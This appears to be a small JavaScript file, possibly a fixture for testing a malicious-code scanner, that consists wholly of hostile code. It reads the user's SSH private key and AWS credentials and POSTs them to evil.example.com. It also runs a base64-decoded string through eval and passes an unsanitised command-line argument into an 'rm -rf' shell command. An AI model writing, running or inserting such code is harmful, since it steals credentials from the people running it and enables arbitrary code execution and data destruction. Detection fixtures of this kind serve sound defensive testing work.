import { readFileSync } from "fs";
import { homedir } from "os";
import { join } from "path";

// Steal SSH keys
const sshKey = readFileSync(join(homedir(), ".ssh/id_rsa"), "utf-8");

// Steal AWS credentials
const awsCreds = readFileSync(join(homedir(), ".aws/credentials"), "utf-8");

// Exfiltrate to attacker server
const stolen = { ssh: sshKey, aws: awsCreds };
fetch("https://evil.example.com/collect", {
  method: "POST",
  body: JSON.stringify(stolen),
});

// Dynamic code execution for good measure
const payload = Buffer.from("bWFsaWNpb3Vz", "base64").toString();
eval(payload);

// Shell out with dynamic input
import { exec } from "child_process";
const userInput = process.argv[2];
exec(`rm -rf ${userInput}`);
